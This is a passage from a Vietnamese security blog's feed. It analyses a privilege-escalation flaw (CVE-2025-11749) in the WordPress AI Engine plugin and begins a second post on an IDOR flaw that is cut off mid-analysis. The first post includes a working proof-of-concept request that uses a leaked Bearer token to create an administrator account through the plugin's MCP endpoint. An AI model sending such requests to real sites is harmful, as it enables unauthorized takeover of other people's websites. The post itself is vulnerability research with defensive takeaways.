here, the user is authorized to use MCP&#xA;    if ( !empty( $prev ) || !isset( $this-&amp;gt;tools()[ $tool ] ) ) {&#xA;      return $prev;&#xA;    }&#xA;    return $this-&amp;gt;dispatch( $tool, $args, $id );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;N·∫øu l√† tool h·ª£p l·ªá =&amp;gt; g·ªçi ƒë·∫øn &lt;code&gt;dispatch( $tool, $args, $id )&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Trong danh s√°ch tool h·ª£p l·ªá, g·ªìm c√≥ tool &lt;code&gt;wp_create_user&lt;/code&gt; d√πng ƒë·ªÉ t·∫°o user m·ªõi =&amp;gt; T·∫°o ƒë∆∞·ª£c ng∆∞·ªùi d√πng v·ªõi quy·ªÅn &lt;code&gt;administrator&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/valid_tool.png&#34; title=&#34;Tool wp_create_user&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/valid_tool.png&#34; data-sub-html=&#34;&lt;h2&gt;Tool&lt;/h2&gt;&lt;p&gt;Tool wp_create_user&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/valid_tool.png&#39; alt=&#34;Tool&#34; height=&#34;411&#34; width=&#34;1098&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Tool wp_create_user&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Tool n√†y y√™u c·∫ßu c√°c thu·ªôc t√≠nh: &lt;code&gt;user_login&lt;/code&gt;, &lt;code&gt;user_email&lt;/code&gt;, &lt;code&gt;user_pass&lt;/code&gt;, &lt;code&gt;display_name&lt;/code&gt;, &lt;code&gt;role&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Request body hi·ªán t·∫°i s·∫Ω nh∆∞ sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;id&amp;#34;: 1,&#xA;  &amp;#34;method&amp;#34;: &amp;#34;tools/call&amp;#34;,&#xA;  &amp;#34;params&amp;#34;: {&#xA;    &amp;#34;name&amp;#34;: &amp;#34;wp_create_user&amp;#34;,&#xA;    &amp;#34;arguments&amp;#34;: {&#xA;      &amp;#34;user_login&amp;#34;: &amp;#34;hacker&amp;#34;,&#xA;      &amp;#34;user_email&amp;#34;: &amp;#34;hacker@gmail.com&amp;#34;,&#xA;      &amp;#34;user_pass&amp;#34;: &amp;#34;hacker&amp;#34;,&#xA;      &amp;#34;display_name&amp;#34;: &amp;#34;hacker&amp;#34;,&#xA;      &amp;#34;role&amp;#34;: &amp;#34;administrator&amp;#34;&#xA;    }&#xA;  },&#xA;  &amp;#34;name&amp;#34;: &amp;#34;2&amp;#34;,&#xA;  &amp;#34;arguments&amp;#34;: &amp;#34;3&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ti·∫øp t·ª•c ph√¢n t√≠ch h√†m &lt;code&gt;dispatch&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;private function dispatch( string $tool, array $a, int $id ): array {&#xA;    $r = [ &amp;#39;jsonrpc&amp;#39; =&amp;gt; &amp;#39;2.0&amp;#39;, &amp;#39;id&amp;#39; =&amp;gt; $id ];&#xA;    switch ( $tool ) {&#xA;    ...&#xA;      case &amp;#39;wp_create_user&amp;#39;:&#xA;        $data = [&#xA;          &amp;#39;user_login&amp;#39; =&amp;gt; sanitize_user( $a[&amp;#39;user_login&amp;#39;] ),&#xA;          &amp;#39;user_email&amp;#39; =&amp;gt; sanitize_email( $a[&amp;#39;user_email&amp;#39;] ),&#xA;          &amp;#39;user_pass&amp;#39; =&amp;gt; $a[&amp;#39;user_pass&amp;#39;] ?? wp_generate_password( 12, true ),&#xA;          &amp;#39;display_name&amp;#39; =&amp;gt; sanitize_text_field( $a[&amp;#39;display_name&amp;#39;] ?? &amp;#39;&amp;#39; ),&#xA;          &amp;#39;role&amp;#39; =&amp;gt; sanitize_key( $a[&amp;#39;role&amp;#39;] ?? get_option( &amp;#39;default_role&amp;#39;, &amp;#39;subscriber&amp;#39; ) ),&#xA;        ];&#xA;        $uid = wp_insert_user( $data );&#xA;        if ( is_wp_error( $uid ) ) {&#xA;          $r[&amp;#39;error&amp;#39;] = [ &amp;#39;code&amp;#39; =&amp;gt; $uid-&amp;gt;get_error_code(), &amp;#39;message&amp;#39; =&amp;gt; $uid-&amp;gt;get_error_message() ];&#xA;        }&#xA;        else {&#xA;          $this-&amp;gt;add_result_text( $r, &amp;#39;User created ID &amp;#39; . $uid );&#xA;        }&#xA;        break;&#xA;    ...&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m g·ªçi ƒë·∫øn &lt;code&gt;wp_insert_user&lt;/code&gt; ƒë·ªÉ t·∫°o t√†i kho·∫£n WordPress m·ªõi v·ªõi t·∫•t c·∫£ c√°c gi√° tr·ªã do ta ki·ªÉm so√°t =&amp;gt; &lt;strong&gt;Privilege Escalation&lt;/strong&gt; x·∫£y ra&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Unauthenticated Attacker&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Access /wp-json&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;REST API exposes MCP endpoints (Bearer Token leaked)&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;Extract Bearer Token from response&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;Send POST request to /wp-json/mcp/v1/{token}/messages&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;permission_callback ‚Üí handle_noauth_access()&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;Bearer Token valid&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;wp_set_current_user(admin)&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;handle_message()&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;method = tools/call&amp;#34;]&#xA;&#xA;J --&amp;gt; K[&amp;#34;execute_tool()&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;mwai_mcp_callback triggered&amp;#34;]&#xA;&#xA;L --&amp;gt; M[&amp;#34;dispatch()&amp;#34;]&#xA;&#xA;M --&amp;gt; N[&amp;#34;wp_create_user()&amp;#34;]&#xA;&#xA;N --&amp;gt; O[&amp;#34;New administrator account created&amp;#34;]&#xA;&#xA;O --&amp;gt; P[&amp;#34;Privilege Escalation&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Truy c·∫≠p endpoint &lt;code&gt;/wp-json&lt;/code&gt; ƒë·ªÉ l·∫•y gi√° tr·ªã &lt;strong&gt;Bearer Token&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;G·ª≠i request:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/mcp/v1/{token}/messages HTTP/1.1&#xA;Host: localhost&#xA;&#xA;{&#xA;  &amp;#34;id&amp;#34;: 1,&#xA;  &amp;#34;method&amp;#34;: &amp;#34;tools/call&amp;#34;,&#xA;  &amp;#34;params&amp;#34;: {&#xA;    &amp;#34;name&amp;#34;: &amp;#34;wp_create_user&amp;#34;,&#xA;    &amp;#34;arguments&amp;#34;: {&#xA;      &amp;#34;user_login&amp;#34;: &amp;#34;hacker&amp;#34;,&#xA;      &amp;#34;user_email&amp;#34;: &amp;#34;hacker@gmail.com&amp;#34;,&#xA;      &amp;#34;user_pass&amp;#34;: &amp;#34;hacker&amp;#34;,&#xA;      &amp;#34;display_name&amp;#34;: &amp;#34;hacker&amp;#34;,&#xA;      &amp;#34;role&amp;#34;: &amp;#34;administrator&amp;#34;&#xA;    }&#xA;  },&#xA;  &amp;#34;name&amp;#34;: &amp;#34;2&amp;#34;,&#xA;  &amp;#34;arguments&amp;#34;: &amp;#34;3&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Login v·ªõi t√†i kho·∫£n v·ª´a t·∫°o&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/result.png&#34; title=&#34;K·∫øt qu·∫£&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;K·∫øt qu·∫£&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/result.png&#39; alt=&#34;Result&#34; height=&#34;638&#34; width=&#34;1243&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;K·∫øt qu·∫£&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng trong AI Engine (‚â§ 3.1.3) xu·∫•t ph√°t t·ª´ vi·ªác &lt;strong&gt;k·∫øt h·ª£p sai gi·ªØa c∆° ch·∫ø ‚ÄúNo-Auth URL‚Äù v√† logic ph√¢n quy·ªÅn n·ªôi b·ªô&lt;/strong&gt;, d·∫´n ƒë·∫øn vi·ªác &lt;strong&gt;c·∫•p quy·ªÅn qu·∫£n tr·ªã ch·ªâ d·ª±a tr√™n m·ªôt Bearer Token b·ªã l·ªô c√¥ng khai&lt;/strong&gt;.&#xA;Khi endpoint MCP ƒë∆∞·ª£c hi·ªÉn th·ªã trong &lt;code&gt;/wp-json&lt;/code&gt;, k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ thu th·∫≠p token, g·ªçi tr·ª±c ti·∫øp API v√† th·ª±c thi c√°c h√†nh ƒë·ªông nh·∫°y c·∫£m nh∆∞ t·∫°o t√†i kho·∫£n qu·∫£n tr·ªã m·ªõi m√† &lt;strong&gt;kh√¥ng c·∫ßn x√°c th·ª±c&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;M·∫∑c d√π quy·ªÅn admin ch·ªâ t·ªìn t·∫°i trong v√≤ng ƒë·ªùi c·ªßa request, nh∆∞ng ch·ªâ c·∫ßn &lt;strong&gt;m·ªôt l·∫ßn g·ªçi h·ª£p l·ªá&lt;/strong&gt; l√† ƒë·ªß ƒë·ªÉ t·∫°o t√†i kho·∫£n qu·∫£n tr·ªã vƒ©nh vi·ªÖn, d·∫´n ƒë·∫øn &lt;strong&gt;Privilege Escalation ho√†n ch·ªânh&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° v3.1.4 ch·ªâ ·∫©n endpoint kh·ªèi REST index, gi√∫p gi·∫£m kh·∫£ nƒÉng b·ªã d√≤ qu√©t, nh∆∞ng &lt;strong&gt;kh√¥ng gi·∫£i quy·∫øt tri·ªát ƒë·ªÉ v·∫•n ƒë·ªÅ thi·∫øt k·∫ø b·∫£o m·∫≠t c·ªët l√µi&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Kh√¥ng bao gi·ªù s·ª≠ d·ª•ng token trong URL nh∆∞ c∆° ch·∫ø x√°c th·ª±c.&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;·∫®n endpoint (&lt;code&gt;show_in_rest = false&lt;/code&gt;) kh√¥ng ƒë·ªìng nghƒ©a v·ªõi b·∫£o m·∫≠t.&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;&lt;code&gt;wp_set_current_user()&lt;/code&gt; kh√¥ng n√™n ƒë∆∞·ª£c d√πng cho x√°c th·ª±c t·ª´ request b√™n ngo√†i.&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;M·ªçi API c√≥ kh·∫£ nƒÉng thay ƒë·ªïi tr·∫°ng th√°i h·ªá th·ªëng ph·∫£i c√≥ x√°c th·ª±c m·∫°nh (auth + authorization).&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vi·ªác g√°n quy·ªÅn admin trong request, d√π t·∫°m th·ªùi, v·∫´n ƒë·ªß ƒë·ªÉ g√¢y leo thang ƒë·∫∑c quy·ªÅn.&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;REST API c·∫ßn ƒë∆∞·ª£c thi·∫øt k·∫ø theo nguy√™n t·∫Øc ‚Äúdeny by default‚Äù.&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ai-engine/vulnerability/wordpress-ai-engine-plugin-3-1-3-unauthenticated-sensitive-information-exposure-to-privilege-escalation-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress AI Engine Plugin &amp;lt;= 3.1.3 is vulnerable to a high priority Privilege Escalation&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2024-13887 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-31-cve-2024-13887/</link>
      <pubDate>Wed, 31 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-31-cve-2024-13887/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-31-cve-2024-13887/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Business Directory Plugin ‚Äì Easy Listing Directories for WordPress&lt;/strong&gt; t·ªìn t·∫°i l·ªó h·ªïng &lt;strong&gt;Insecure Direct Object Reference (IDOR)&lt;/strong&gt; trong t·∫•t c·∫£ c√°c phi√™n b·∫£n t·ª´ tr∆∞·ªõc ƒë·∫øn &lt;strong&gt;6.4.14&lt;/strong&gt;, th√¥ng qua h√†m &lt;code&gt;ajax_listing_submit_image_upload&lt;/code&gt; do thi·∫øu ki·ªÉm tra h·ª£p l·ªá ƒë·ªëi v·ªõi m·ªôt kh√≥a do ng∆∞·ªùi d√πng ki·ªÉm so√°t. ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng &lt;strong&gt;ch∆∞a x√°c th·ª±c&lt;/strong&gt; c√≥ th·ªÉ &lt;strong&gt;t·∫£i l√™n h√¨nh ·∫£nh t√πy √Ω v√†o c√°c listing&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2024-13887&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2024-13887&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 6.4.14&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 6.4.15&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/business-directory-plugin/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Business Directory Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Business Directory&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;6.4.14&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;6.4.15&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒëƒÉng k√Ω AJAX handler &lt;strong&gt;cho ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng 